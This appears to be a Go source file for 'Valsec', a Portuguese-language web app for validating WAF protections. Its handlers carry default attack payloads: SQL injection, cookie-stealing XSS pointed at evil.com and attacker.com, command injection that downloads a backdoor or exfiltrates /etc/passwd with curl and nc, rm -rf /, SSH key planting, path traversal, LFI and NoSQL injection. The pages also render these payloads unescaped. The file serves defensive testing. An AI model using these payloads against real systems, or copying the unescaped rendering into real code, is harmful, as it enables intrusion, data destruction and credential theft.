package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
)

// Response representa a estrutura de resposta da API
type Response struct {
	Status  string      `json:"status"`
	Message string      `json:"message"`
	Data    interface{} `json:"data,omitempty"`
}

// Função para detectar qual CDN está sendo utilizada
func detectCDN(r *http.Request) string {
	// Para ambientes locais (localhost), exibir uma informação específica
	if r.Host == "localhost:8080" || strings.HasPrefix(r.Host, "localhost:") {
		return "Ambiente Local"
	}

	// Verificar headers comuns que indicam a presença de CDNs
	cdnHeaders := map[string]string{
		"CF-Ray":              "Cloudflare",
		"X-Fastly-Request-ID": "Fastly",
		"X-Akamai-Request-ID": "Akamai",
		"X-CDN-Provider":      "", // Header genérico, usa o valor como nome da CDN
		"X-Amz-Cf-Id":         "Amazon CloudFront",
		"X-Cache-Hits":        "Possível CDN",
		"Via":                 "", // Pode conter informações sobre CDN
	}

	for header, cdnName := range cdnHeaders {
		if value := r.Header.Get(header); value != "" {
			if cdnName == "" {
				// Para headers como Via ou X-CDN-Provider, usar o valor como nome
				if header == "Via" {
					parts := strings.Split(value, " ")
					if len(parts) > 1 {
						return parts[1] // Geralmente contém o nome da CDN
					}
					return value
				}
				return value // Usar o valor do header como nome da CDN
			}
			return cdnName
		}
	}

	// Verificar se há um header personalizado definido via variável de ambiente
	customCDNHeader := os.Getenv("CUSTOM_CDN_HEADER")
	if customCDNHeader != "" && r.Header.Get(customCDNHeader) != "" {
		return r.Header.Get(customCDNHeader)
	}

	// Se nenhuma CDN for detectada, verificar se há uma CDN padrão definida
	defaultCDN := os.Getenv("DEFAULT_CDN")
	if defaultCDN != "" {
		return defaultCDN
	}
	
	return "Nenhuma CDN detectada"
}

func main() {
	version := os.Getenv("VERSION")
	if version == "" {
		version = "A" // Default to version A if not specified
	}

	// Configuração de rotas
	setupRoutes()

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	log.Printf("Iniciando servidor na porta %s com versão %s", port, version)
	log.Fatal(http.ListenAndServe(":"+port, nil))
}

// Função para renderizar o template com Tailwind CSS
func renderTemplate(w http.ResponseWriter, r *http.Request, title, description, payload, attackType string) {
	// Obter a versão atual da aplicação
	version := os.Getenv("VERSION")
	if version == "" {
		version = "A" // Default to version A if not specified
	}
	
	// Detectar a CDN utilizada
	cdnInfo := detectCDN(r)
	
	html := fmt.Sprintf(`
	<!DOCTYPE html>
	<html lang="pt-BR">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>Valsec</title>
		<script src="https://cdn.tailwindcss.com"></script>
		<script>
			tailwind.config = {
				darkMode: 'class',
				theme: {
					extend: {
						colors: {
							primary: '#6366f1',
							secondary: '#8b5cf6',
							danger: '#ef4444',
						}
					}
				}
			}
		</script>
	</head>
	<body class="bg-gray-900 text-gray-100 min-h-screen flex items-center justify-center p-4">
		<div class="max-w-2xl w-full bg-gray-800 rounded-lg shadow-xl overflow-hidden">
			<div class="bg-gradient-to-r from-primary to-secondary p-4">
				<div class="flex items-center justify-between">
					<h1 class="text-2xl font-bold text-white">Valsec</h1>
					<span class="px-2 py-1 text-xs font-medium bg-indigo-700 text-white rounded-full">v%s</span>
				</div>
				<div class="mt-1">
					<span class="text-xs text-white/70">%s</span>
				</div>
			</div>
			<div class="p-6">
				<div class="mb-6">
					<h2 class="text-xl font-semibold text-gray-200 mb-2">Descrição do Teste</h2>
					<p class="text-gray-300">%s</p>
				</div>
				
				<div class="mb-6">
					<h2 class="text-xl font-semibold text-gray-200 mb-2">Payload Detectado</h2>
					<div class="bg-gray-700 p-3 rounded-md">
						<code class="text-amber-400 break-all">%s</code>
					</div>
				</div>
				
				<div class="bg-red-900/30 border border-red-500/50 rounded-md p-4 mb-6">
					<div class="flex items-start">
						<svg class="w-6 h-6 text-red-500 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
							<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
						</svg>
						<div>
							<h3 class="text-lg font-medium text-red-400">Alerta de Segurança</h3>
							<p class="text-gray-300 mt-1">Este é um teste de segurança para verificar proteções contra ataques de %s. Em um ambiente real, este tipo de requisição seria bloqueado pelo Cloudflare OWASP Core Ruleset.</p>
						</div>
					</div>
				</div>
				
				<div class="flex justify-between">
					<a href="/" class="inline-flex items-center px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors">
						<svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
							<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path>
						</svg>
						Voltar
					</a>
					<span class="text-sm text-gray-400">Valsec - Versão: %s</span>
				</div>
			</div>
		</div>
	</body>
	</html>
	`, version, cdnInfo, description, payload, attackType, version)
	
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, html)
}

// Configuração das rotas
func setupRoutes() {
	http.HandleFunc("/", handleIndex)
	http.HandleFunc("/sql-injection", handleSQLInjection)
	http.HandleFunc("/xss", handleXSS)
	http.HandleFunc("/command-injection", handleCommandInjection)
	http.HandleFunc("/path-traversal", handlePathTraversal)
	http.HandleFunc("/lfi", handleLFI)
	http.HandleFunc("/api-test", handleAPITest)
	http.HandleFunc("/api-post", handleAPIPost)
	http.HandleFunc("/combined-attack", handleCombinedAttack)
}

// Handler para SQL Injection com alta pontuação de anomalia
func handleSQLInjection(w http.ResponseWriter, r *http.Request) {
	// Obter múltiplos parâmetros para aumentar a detecção pelo WAF
	id := r.URL.Query().Get("id")
	table := r.URL.Query().Get("table")
	column := r.URL.Query().Get("column")
	order := r.URL.Query().Get("order")
	limit := r.URL.Query().Get("limit")
	
	// Valores padrão maliciosos se não forem fornecidos
	if id == "" {
		id = "1' UNION SELECT username,password,uid,gid FROM users WHERE '1'='1; DROP TABLE users; INSERT INTO admin VALUES ('hacker','hacker'); --"
	}
	if table == "" {
		table = "users; DROP DATABASE security; --"
	}
	if column == "" {
		column = "id,username,password FROM users WHERE 1=1 UNION ALL SELECT null,table_name,column_name FROM information_schema.columns; --"
	}
	if order == "" {
		order = "1; UPDATE users SET admin=1 WHERE username LIKE '%admin%'; --"
	}
	if limit == "" {
		limit = "10; EXEC xp_cmdshell('net user hacker Password123 /add'); --"
	}
	
	log.Printf("SQL Injection Test - ID: %s, Table: %s, Column: %s, Order: %s, Limit: %s", 
		id, table, column, order, limit)
	
	title := "Teste de SQL Injection"
	description := "Este teste simula uma tentativa de injeção SQL que poderia permitir acesso não autorizado a dados, modificação de dados ou comprometimento do banco de dados."
	payload := fmt.Sprintf("SELECT %s FROM %s WHERE id = '%s' ORDER BY %s LIMIT %s", 
		column, table, id, order, limit)
	attackType := "SQL Injection"
	
	renderTemplate(w, r, title, description, payload, attackType)
}

// Handler para XSS com alta pontuação de anomalia
func handleXSS(w http.ResponseWriter, r *http.Request) {
	// Obter múltiplos parâmetros para aumentar a detecção pelo WAF
	name := r.URL.Query().Get("name")
	comment := r.URL.Query().Get("comment")
	profile := r.URL.Query().Get("profile")
	redirect := r.URL.Query().Get("redirect")
	theme := r.URL.Query().Get("theme")
	
	// Valores padrão maliciosos se não forem fornecidos
	if name == "" {
		name = "<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))><iframe/src=\"javascript:alert(`${document.cookie}`)\">"
	}
	if comment == "" {
		comment = "<img src=x onerror=\"fetch('https://evil.com/steal?cookie='+document.cookie)\">"
	}
	if profile == "" {
		profile = "<script>var img=new Image();img.src='https://attacker.com/steal?data='+document.cookie;</script>"
	}
	if redirect == "" {
		redirect = "javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))"
	}
	if theme == "" {
		theme = "default');document.location='https://evil.com/phish?token='+localStorage.getItem('auth_token');//"
	}
	
	log.Printf("XSS Test - Name: %s, Comment: %s, Profile: %s, Redirect: %s, Theme: %s", 
		name, comment, profile, redirect, theme)
	
	title := "Teste de Cross-Site Scripting (XSS)"
	description := "Este teste simula uma tentativa de injeção de scripts maliciosos que poderiam ser executados no navegador de outros usuários, permitindo roubo de sessões, redirecionamentos maliciosos ou outras ações não autorizadas."
	payload := fmt.Sprintf("Nome: %s<br>Comentário: %s<br>Perfil: %s<br>Redirecionamento: %s<br>Tema: %s", 
		name, comment, profile, redirect, theme)
	attackType := "Cross-Site Scripting"
	
	renderTemplate(w, r, title, description, payload, attackType)
}

// Handler para Command Injection com alta pontuação de anomalia
func handleCommandInjection(w http.ResponseWriter, r *http.Request) {
	// Obter múltiplos parâmetros para aumentar a detecção pelo WAF
	host := r.URL.Query().Get("host")
	cmd := r.URL.Query().Get("cmd")
	file := r.URL.Query().Get("file")
	path := r.URL.Query().Get("path")
	user := r.URL.Query().Get("user")
	
	// Valores padrão maliciosos se não forem fornecidos
	if host == "" {
		host = "localhost;cat /etc/passwd;id;uname -a;ls -la;wget http://malicious.com/backdoor -O /tmp/backdoor;chmod +x /tmp/backdoor;/tmp/backdoor"
	}
	if cmd == "" {
		cmd = "ls -la & echo 'PWNED' & cat /etc/shadow & curl -X POST -d @/etc/passwd https://attacker.com/exfil"
	}
	if file == "" {
		file = "/etc/passwd | grep -v 'nologin' | awk -F: '{print $1\":\"$7}' | nc attacker.com 8888"
	}
	if path == "" {
		path = "/var/www/html; rm -rf /; echo 'HACKED' > index.html"
	}
	if user == "" {
		user = "admin & echo 'ssh-rsa AAAAB...' >> ~/.ssh/authorized_keys"
	}
	
	log.Printf("Command Injection Test - Host: %s, Cmd: %s, File: %s, Path: %s, User: %s", 
		host, cmd, file, path, user)
	
	title := "Teste de Command Injection"
	description := "Este teste simula uma tentativa de injeção de comandos do sistema operacional que poderiam ser executados no servidor, permitindo acesso não autorizado a arquivos, execução de programas maliciosos ou comprometimento do sistema."
	payload := fmt.Sprintf("ping -c 1 %s && %s && cat %s && cd %s && su %s", 
		host, cmd, file, path, user)
	attackType := "Command Injection"
	
	renderTemplate(w, r, title, description, payload, attackType)
}

// Handler para Path Traversal com alta pontuação de anomalia
func handlePathTraversal(w http.ResponseWriter, r *http.Request) {
	file := r.URL.Query().Get("file")
	depth := r.URL.Query().Get("depth")
	type_param := r.URL.Query().Get("type")
	encoding := r.URL.Query().Get("encoding")
	
	if file == "" {
		file = "../../../../../../../etc/passwd%00.jpg"
	}
	if depth == "" {
		depth = "../../../../../../../../"
	}
	if type_param == "" {
		type_param = "php://filter/convert.base64-encode/resource=/etc/passwd"
	}
	if encoding == "" {
		encoding = "%252e%252e%252f%252e%252e%252f%252e%252e%252f"
	}
	
	log.Printf("Path Traversal Test - File: %s, Depth: %s, Type: %s, Encoding: %s", 
		file, depth, type_param, encoding)
	
	title := "Teste de Path Traversal"
	description := "Este teste simula uma tentativa de acesso a arquivos fora do diretório permitido, o que poderia expor arquivos sensíveis do sistema, configurações ou dados privados."
	payload := fmt.Sprintf("open('%s%s%s', 'r', '%s')", depth, type_param, file, encoding)
	attackType := "Path Traversal"
	
	renderTemplate(w, r, title, description, payload, attackType)
}

// Handler para Local File Inclusion (LFI) com alta pontuação de anomalia
func handleLFI(w http.ResponseWriter, r *http.Request) {
	page := r.URL.Query().Get("page")
	wrapper := r.URL.Query().Get("wrapper")
	filter := r.URL.Query().Get("filter")
	protocol := r.URL.Query().Get("protocol")
	
	if page == "" {
		page = "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
	}
	if wrapper == "" {
		wrapper = "php://filter/convert.base64-encode/resource="
	}
	if filter == "" {
		filter = "expect://id"
	}
	if protocol == "" {
		protocol = "file:///etc/passwd"
	}
	
	log.Printf("LFI Test - Page: %s, Wrapper: %s, Filter: %s, Protocol: %s", 
		page, wrapper, filter, protocol)
	
	title := "Teste de Local File Inclusion"
	description := "Este teste simula uma tentativa de inclusão de arquivos locais não autorizados, o que poderia permitir a execução de código malicioso, acesso a informações sensíveis ou comprometimento do sistema."
	payload := fmt.Sprintf("include('%s%s'); include('%s'); include('%s');", wrapper, page, filter, protocol)
	attackType := "Local File Inclusion"
	
	renderTemplate(w, r, title, description, payload, attackType)
}

// Handler para API Test com alta pontuação de anomalia
func handleAPITest(w http.ResponseWriter, r *http.Request) {
	apiKey := r.URL.Query().Get("api_key")
	token := r.URL.Query().Get("token")
	auth := r.URL.Query().Get("auth")
	secret := r.URL.Query().Get("secret")
	access := r.URL.Query().Get("access")
	
	if apiKey == "" {
		apiKey = "sk_test_12345' OR 1=1; DROP TABLE users; --"
	}
	if token == "" {
		token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhhY2tlciIsImFkbWluIjp0cnVlfQ"
	}
	if auth == "" {
		auth = "Basic YWRtaW46YWRtaW4=" // admin:admin em Base64
	}
	if secret == "" {
		secret = "client_secret=test' UNION SELECT * FROM users; --"
	}
	if access == "" {
		access = "Bearer STOLEN_TOKEN' OR 1=1; --"
	}
	
	log.Printf("API Test - API Key: %s, Token: %s, Auth: %s, Secret: %s, Access: %s", 
		apiKey, token, auth, secret, access)
	
	title := "Teste de API Security"
	description := "Este teste simula uma tentativa de manipulação de parâmetros de API que poderiam permitir acesso não autorizado, vazamento de dados ou comprometimento da segurança da API."
	payload := fmt.Sprintf("Authorization: Bearer %s\nX-API-Key: %s\nAuthorization: %s\nClient-Secret: %s\nAccess-Token: %s", 
		apiKey, token, auth, secret, access)
	attackType := "API Security"
	
	renderTemplate(w, r, title, description, payload, attackType)
}

// Handler para API POST com alta pontuação de anomalia
func handleAPIPost(w http.ResponseWriter, r *http.Request) {
	title := "Teste de API POST Security"
	description := "Este teste simula uma tentativa de manipulação de parâmetros em uma requisição POST para API, o que poderia permitir injeção de dados maliciosos, acesso não autorizado ou comprometimento da segurança da API."
	payload := `{
  "user": {"$ne": null, "$exists": true, "$in": ["admin", "root"]},
  "password": {"$regex": ".*", "$options": "i"},
  "$where": "function() { return this.admin === true || this.isAdmin === true; }",
  "token": "' OR '1'='1; DROP TABLE users; --",
  "query": {"$gt": {"$where": "db.collection.drop()"}},
  "projection": {"$function": {"body": "function() { return db.getCollectionNames(); }"}},
  "filter": {"$jsonSchema": {"required": ["admin"], "properties": {"admin": {"enum": [true]}}}},
  "update": {"$set": {"admin": true, "role": "superuser"}}
}`
	attackType := "API POST Security"
	
	renderTemplate(w, r, title, description, payload, attackType)
}

// Handler para Combined Attack com alta pontuação de anomalia
func handleCombinedAttack(w http.ResponseWriter, r *http.Request) {
	input := r.URL.Query().Get("input")
	sql_part := r.URL.Query().Get("sql")
	xss_part := r.URL.Query().Get("xss")
	cmd_part := r.URL.Query().Get("cmd")
	lfi_part := r.URL.Query().Get("lfi")
	
	if input == "" {
		input = "' OR 1=1; DROP TABLE users; --><script>alert(document.cookie)</script>"
	}
	if sql_part == "" {
		sql_part = "UNION SELECT username,password FROM users WHERE 1=1; --"
	}
	if xss_part == "" {
		xss_part = "<img src=x onerror=fetch('https://evil.com/steal?cookie='+document.cookie)>"
	}
	if cmd_part == "" {
		cmd_part = "; cat /etc/passwd | curl -d @- https://attacker.com/exfil"
	}
	if lfi_part == "" {
		lfi_part = "php://filter/convert.base64-encode/resource=/etc/passwd"
	}
	
	log.Printf("Combined Attack Test - Input: %s, SQL: %s, XSS: %s, CMD: %s, LFI: %s", 
		input, sql_part, xss_part, cmd_part, lfi_part)
	
	title := "Teste de Ataque Combinado"
	description := "Este teste simula um ataque que combina múltiplas técnicas (SQL Injection, XSS, etc.) em um único payload, o que poderia aumentar as chances de sucesso ao tentar contornar mecanismos de segurança."
	payload := fmt.Sprintf(`
SQL: SELECT * FROM users WHERE username = '%s %s';
EXEC: system("%s %s");
INCLUDE: include("%s %s");
HTML: <div>%s %s</div>
COOKIE: document.cookie="%s; path=/; domain=.example.com"
	`, input, sql_part, input, cmd_part, input, lfi_part, input, xss_part, input)
	attackType := "Combined Attack"
	
	renderTemplate(w, r, title, description, payload, attackType)
}

// Função para renderizar a página inicial
func handleIndex(w http.ResponseWriter, r *http.Request) {
	// Obter a versão atual da aplicação
	version := os.Getenv("VERSION")
	if version == "" {
		version = "A" // Default to version A if not specified
	}
	
	// Detectar a CDN utilizada
	cdnInfo := detectCDN(r)
	
	html := fmt.Sprintf(`
	<!DOCTYPE html>
	<html lang="pt-BR">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>Valsec</title>
		<script src="https://cdn.tailwindcss.com"></script>
		<script>
			tailwind.config = {
				darkMode: 'class',
				theme: {
					extend: {
						colors: {
							primary: '#6366f1',
							secondary: '#8b5cf6',
							danger: '#ef4444',
						}
					}
				}
			}
		</script>
	</head>
	<body class="bg-gray-900 text-gray-100 min-h-screen">
		<div class="container mx-auto px-4 py-8">
			<header class="mb-10 text-center">
				<div class="flex items-center justify-center gap-3">
					<h1 class="text-4xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-primary to-secondary inline-block">Valsec</h1>
					<span class="px-2 py-1 text-xs font-medium bg-indigo-700 text-white rounded-full">v%s</span>
				</div>
				<p class="text-xl text-gray-300 mt-2">Plataforma para testes de segurança e validação de WAF</p>
				<div class="mt-2 text-sm text-gray-400">%s</div>
			</header>
			
			<div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
				<!-- SQL Injection Card -->
				<div class="bg-gray-800 rounded-lg overflow-hidden shadow-lg hover:shadow-xl transition-shadow">
					<div class="p-6">
						<div class="flex items-center mb-4">
							<div class="bg-primary/20 p-3 rounded-full mr-4">
								<svg class="w-6 h-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
									<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4"></path>
								</svg>
							</div>
							<h2 class="text-xl font-semibold">SQL Injection</h2>
						</div>
						<p class="text-gray-400 mb-6">Teste de proteção contra injeção de comandos SQL maliciosos.</p>
						<a href="/sql-injection" class="block w-full bg-primary hover:bg-primary/80 text-white font-medium py-2 px-4 rounded text-center transition-colors">
							Executar Teste
						</a>
					</div>
				</div>
				
				<!-- XSS Card -->
				<div class="bg-gray-800 rounded-lg overflow-hidden shadow-lg hover:shadow-xl transition-shadow">
					<div class="p-6">
						<div class="flex items-center mb-4">
							<div class="bg-secondary/20 p-3 rounded-full mr-4">
								<svg class="w-6 h-6 text-secondary" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
									<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"></path>
								</svg>
							</div>
							<h2 class="text-xl font-semibold">Cross-Site Scripting</h2>
						</div>
						<p class="text-gray-400 mb-6">Teste de proteção contra injeção de scripts maliciosos.</p>
						<a href="/xss" class="block w-full bg-secondary hover:bg-secondary/80 text-white font-medium py-2 px-4 rounded text-center transition-colors">
							Executar Teste
						</a>
					</div>
				</div>
				
				<!-- Command Injection Card -->
				<div class="bg-gray-800 rounded-lg overflow-hidden shadow-lg hover:shadow-xl transition-shadow">
					<div class="p-6">
						<div class="flex items-center mb-4">
							<div class="bg-danger/20 p-3 rounded-full mr-4">
								<svg class="w-6 h-6 text-danger" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
									<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
								</svg>
							</div>
							<h2 class="text-xl font-semibold">Command Injection</h2>
						</div>
						<p class="text-gray-400 mb-6">Teste de proteção contra injeção de comandos do sistema.</p>
						<a href="/command-injection" class="block w-full bg-danger hover:bg-danger/80 text-white font-medium py-2 px-4 rounded text-center transition-colors">
							Executar Teste
						</a>
					</div>
				</div>
				
				<!-- Path Traversal Card -->
				<div class="bg-gray-800 rounded-lg overflow-hidden shadow-lg hover:shadow-xl transition-shadow">
					<div class="p-6">
						<div class="flex items-center mb-4">
							<div class="bg-primary/20 p-3 rounded-full mr-4">
								<svg class="w-6 h-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
									<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path>
								</svg>
							</div>
							<h2 class="text-xl font-semibold">Path Traversal</h2>
						</div>
						<p class="text-gray-400 mb-6">Teste de proteção contra acesso a arquivos fora do diretório permitido.</p>
						<a href="/path-traversal" class="block w-full bg-primary hover:bg-primary/80 text-white font-medium py-2 px-4 rounded text-center transition-colors">
							Executar Teste
						</a>
					</div>
				</div>
				
				<!-- LFI Card -->
				<div class="bg-gray-800 rounded-lg overflow-hidden shadow-lg hover:shadow-xl transition-shadow">
					<div class="p-6">
						<div class="flex items-center mb-4">
							<div class="bg-secondary/20 p-3 rounded-full mr-4">
								<svg class="w-6 h-6 text-secondary" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
									<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
								</svg>
							</div>
							<h2 class="text-xl font-semibold">Local File Inclusion</h2>
						</div>
						<p class="text-gray-400 mb-6">Teste de proteção contra inclusão de arquivos locais não autorizados.</p>
						<a href="/lfi" class="block w-full bg-secondary hover:bg-secondary/80 text-white font-medium py-2 px-4 rounded text-center transition-colors">
							Executar Teste
						</a>
					</div>
				</div>
				
				<!-- Combined Attack Card -->
				<div class="bg-gray-800 rounded-lg overflow-hidden shadow-lg hover:shadow-xl transition-shadow">
					<div class="p-6">
						<div class="flex items-center mb-4">
							<div class="bg-danger/20 p-3 rounded-full mr-4">
								<svg class="w-6 h-6 text-danger" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
									<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
								</svg>
							</div>
							<h2 class="text-xl font-semibold">Ataque Combinado</h2>
						</div>
						<p class="text-gray-400 mb-6">Teste de proteção contra múltiplos vetores de ataque combinados.</p>
						<a href="/combined-attack" class="block w-full bg-danger hover:bg-danger/80 text-white font-medium py-2 px-4 rounded text-center transition-colors">
							Executar Teste
						</a>
					</div>
				</div>
			</div>
			
			<footer class="mt-16 text-center text-gray-500">
				<p>Valsec &copy; 2023 - Servidor: %s - <span class="inline-flex items-center"><span class="px-2 py-1 text-xs font-medium bg-indigo-700 text-white rounded-full mr-2">v%s</span> %s</span></p>
			</footer>
		</div>
	</body>
	</html>
	`, version, cdnInfo, getHostname(), version, cdnInfo)
	
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, html)
}

// Função para obter o hostname do servidor
func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return hostname
}
